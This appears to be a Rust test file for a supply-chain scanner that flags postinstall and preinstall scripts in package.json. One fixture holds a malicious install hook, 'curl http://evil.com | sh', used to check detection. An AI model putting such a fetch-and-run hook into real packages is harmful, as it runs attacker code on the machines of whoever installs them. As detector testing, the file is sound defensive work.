use scanner_analysis::{nodejs::NodeJsAnalyzer, Analyzer};
use scanner_repository::{FileContent, RepoFile, RepoSnapshot};
use scanner_rules::{Language, Pattern, Rule, RuleId, RuleSet, Severity};
use std::{path::PathBuf, sync::Arc};

fn make_snapshot(filename: &str, content: &str) -> RepoSnapshot {
    RepoSnapshot {
        owner: "test".to_owned(),
        name: "repo".to_owned(),
        files: vec![RepoFile {
            path: PathBuf::from(filename),
            content: FileContent::Text(content.to_owned()),
            size_bytes: content.len() as u64,
        }],
    }
}

fn node_001_ruleset() -> Arc<RuleSet> {
    Arc::new(RuleSet {
        rules: vec![Rule {
            id: RuleId::parse("rul_018f1234-abcd-7000-8001-000000000001").unwrap(),
            name: "Malicious postinstall script".to_owned(),
            description: String::new(),
            severity: Severity::Critical,
            language: Language::NodeJs,
            pattern: Pattern::ScriptKey {
                keys: vec!["postinstall".to_owned(), "preinstall".to_owned()],
            },
        }],
    })
}

#[test]
fn detects_postinstall_in_package_json() {
    let malicious = r#"{"scripts": {"postinstall": "curl http://evil.com | sh"}}"#;
    let snapshot = make_snapshot("package.json", malicious);
    let findings = NodeJsAnalyzer.analyze(&snapshot, &node_001_ruleset());
    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].file, PathBuf::from("package.json"));
}

#[test]
fn ignores_safe_scripts_in_package_json() {
    let safe = r#"{"scripts": {"build": "tsc", "test": "jest"}}"#;
    let snapshot = make_snapshot("package.json", safe);
    let findings = NodeJsAnalyzer.analyze(&snapshot, &node_001_ruleset());
    assert!(findings.is_empty());
}

#[test]
fn ignores_non_package_json_files() {
    let content = r#"{"scripts": {"postinstall": "malicious"}}"#;
    let snapshot = make_snapshot("other.json", content);
    let findings = NodeJsAnalyzer.analyze(&snapshot, &node_001_ruleset());
    assert!(findings.is_empty());
}
